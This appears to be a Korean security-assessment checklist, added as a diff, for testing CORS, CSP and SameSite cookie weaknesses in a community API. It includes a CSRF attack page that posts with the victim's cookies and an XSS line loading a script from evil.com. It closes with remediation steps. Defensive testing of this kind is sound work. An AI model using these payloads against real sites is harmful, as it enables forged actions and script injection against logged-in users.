@@ -1,0 +1,102 @@
+================================================================================
+[VCE-CM-26] 취약한 보안 설정 (커뮤니티)
+도메인: community
+================================================================================
+
+1. 진단 항목 개요
+   - 항목명: CORS 과다 허용, CSP 미설정으로 XSS 무방어
+   - 번호: CM-26
+   - 위험도: Medium
+   - OWASP: A05:2021 – Security Misconfiguration
+
+2. 대상 기능 & 엔드포인트
+   - 로컬:  http://localhost:8080/api/community/**
+   - 운영:  https://vceapp.com/api/community/**
+   - HTTP 메서드: OPTIONS (CORS Preflight), GET
+
+3. 취약점 원리 (Why this works)
+   CORS 설정에서 allowedOrigins: * 또는 요청 Origin을 그대로 허용하면:
+   - evil.com 에서 vceapp.com의 API를 직접 호출 가능
+   - 피해자 브라우저를 통한 CSRF 공격 가능
+
+   Content-Security-Policy가 없으면:
+   - CommunityDetail.tsx:323의 dangerouslySetInnerHTML로 삽입된 스크립트가 실행
+   - 외부 도메인의 스크립트 로드 허용 (CDN 인젝션 가능)
+   - eval(), inline 스크립트 실행 허용
+
+   vce_token 쿠키에 SameSite 속성이 없으면:
+   - 교차 사이트 요청에 쿠키 자동 포함 → CSRF 공격
+
+4. 테스트 절차 (Step-by-step)
+
+   Step 1. 악성 Origin으로 CORS Preflight 테스트
+   --- HTTP 요청 예시 ---
+   OPTIONS /api/community/posts HTTP/1.1
+   Host: localhost:8080
+   Origin: https://evil.com
+   Access-Control-Request-Method: POST
+   Access-Control-Request-Headers: Authorization, Content-Type
+   ---
+
+   취약 응답:
+   Access-Control-Allow-Origin: https://evil.com
+   Access-Control-Allow-Credentials: true
+
+   Step 2. CSP 헤더 확인
+   --- HTTP 요청 예시 ---
+   GET /api/community/posts/1 HTTP/1.1
+   Host: localhost:8080
+   ---
+
+   응답에 Content-Security-Policy 헤더 없으면 취약
+
+   Step 3. CSRF 공격 시나리오 (SameSite 없음)
+   공격자 페이지 (evil.com):
+   <html><body>
+   <script>
+   fetch('http://localhost:8080/api/community/posts', {
+     method: 'POST',
+     credentials: 'include',
+     headers: {'Content-Type': 'application/json'},
+     body: JSON.stringify({title:'CSRF 게시글', content:'공격자 내용'})
+   });
+   </script>
+   </body></html>
+
+   피해자가 evil.com 방문 + vceapp.com 로그인 상태이면:
+   쿠키 자동 포함으로 CSRF 게시글 작성 성공 여부 확인
+
+   Step 4. CSP 우회 시도 (dangerouslySetInnerHTML + CSP 없음)
+   게시글 content에 외부 스크립트 로드:
+   <script src="https://evil.com/malware.js"></script>
+   CSP가 없으면 외부 스크립트 로드 가능
+
+   Step 5. 쿠키 SameSite 속성 확인
+   브라우저 DevTools → Application → Cookies
+   vce_token의 SameSite 값 확인:
+   - None: CSRF 취약
+   - Lax: 일부 요청에 쿠키 포함
+   - Strict: 안전
+
+5. 취약 여부 판단 기준
+   ✅ 취약 (Vulnerable):
+      - evil.com Origin으로 CORS Preflight → Access-Control-Allow-Origin: evil.com
+      - CSP 헤더 없음 → 외부 스크립트 로드 가능
+      - CSRF 요청으로 게시글 작성 성공
+      - vce_token SameSite=None (또는 없음)
+   ✗ 안전 (Not Vulnerable):
+      - CORS: 허용 Origin 화이트리스트만
+      - CSP: default-src 'self' 설정됨
+      - vce_token SameSite=Strict
+
+6. 예상 취약 포인트 (코드 위치)
+   - SecurityConfig.java — corsConfiguration.setAllowedHeaders(List.of("*"))
+   - SecurityConfig.java — allowedOrigins 설정
+   - SecurityConfig.java — CSRF 비활성화 (REST API)
+   - OAuth2SuccessHandler.java — 쿠키 SameSite 속성 미설정
+
+7. 권고 조치
+   - CORS allowedOrigins 화이트리스트: exchange.vceapp.com, bank.vceapp.com
+   - CSP 헤더 설정: default-src 'self'; script-src 'self'; connect-src 'self' api.upbit.com
+   - 쿠키 SameSite=Strict 설정
+   - CSRF 방어: SameSite 쿠키 또는 CSRF 토큰 중 하나 적용
